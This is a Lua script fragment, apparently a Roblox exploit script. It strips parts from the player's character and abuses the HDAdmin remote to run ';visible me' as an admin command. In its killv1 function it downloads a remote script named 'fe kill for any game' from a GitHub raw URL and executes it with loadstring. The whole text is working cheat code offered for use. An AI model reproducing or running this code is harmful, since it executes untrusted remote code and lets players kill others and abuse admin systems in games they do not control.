    function Equip()
        for i, v in pairs(speaker.Backpack:GetChildren()) do
            if v:IsA("Tool") and v.Name == radio then
                wait(.08)
                v.Parent = speaker.Character
            end
        end
    end

    function Mesh()
        Equip()
        -- [ Locals ] --
        local Player = game.Players.LocalPlayer
        local Char = Player.Character
        for i,v in pairs(Char:GetDescendants()) do
            if v.Name == "Union" then
                v:Destroy()
         end
        end
        for i,v in pairs(Char:GetDescendants()) do
            if v.Name ==  "Beam" then
                v:Destroy()
         end
        end
        for i,v in pairs(Char:GetDescendants()) do
            if v.Name ==  "B1" then
                v:Destroy()
         end
        end
        for i,v in pairs(Char:GetDescendants()) do
            if v.Name ==  "B2" then
                v:Destroy()
         end
        end
        for i,v in pairs(Char:GetDescendants()) do
            if v.Name ==  "BB1" then
                v:Destroy()
         end
        end
        for i,v in pairs(Char:GetDescendants()) do
            if v.Name ==  "BB2" then
                v:Destroy()
         end
        end
        for i,v in pairs(Char:GetDescendants()) do
            if v.Name ==  "ParticleEmitter" then
                v:Destroy()
         end
        end
        for i,v in pairs(Char:GetDescendants()) do
            if v.Name ==  "Trail" then
                v:Destroy()
         end
        end
        for i,v in pairs(Char:GetDescendants()) do
            if v.Name ==  "Trail" then
                v:Destroy()
         end
        end
        for i,v in pairs(Char:GetDescendants()) do
            if v.Name ==  "Trail0" then
                v:Destroy()
         end
        end
        for i,v in pairs(Char:GetDescendants()) do
            if v.Name ==  "Trail1" then
                v:Destroy()
         end
        end
        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";visible me")
        end

    function r15(plr)
        if plr.Character:FindFirstChildOfClass('Humanoid').RigType == Enum.HumanoidRigType.R15 then
            return true
        end
    end

    spawn(function ()
        function killv1()
        if not game:GetService("CoreGui")["IvAdmin CommandBar"] then
            if _G.killv1 == false then
        loadstring(game:HttpGet('https://raw.githubusercontent.com/klat3mk/remake/main/fe%20kill%20for%20any%20game'))()
        _G.killv1 = true
        end
    else 
        print("executed")
    end
    end
    end)


